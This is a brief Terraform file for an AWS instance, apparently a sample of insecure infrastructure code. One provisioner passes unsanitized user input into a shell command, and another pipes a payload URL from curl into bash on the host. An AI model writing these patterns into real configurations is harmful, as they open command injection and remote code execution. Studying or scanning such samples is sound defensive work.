resource "aws_instance" "web" {
  ami           = "ami-123456"
  instance_type = "t3.micro"

  provisioner "local-exec" {
    command = "echo ${var.user_input} >> /tmp/log"
  }

  provisioner "remote-exec" {
    inline = ["curl ${var.payload_url} | bash"]
  }
}
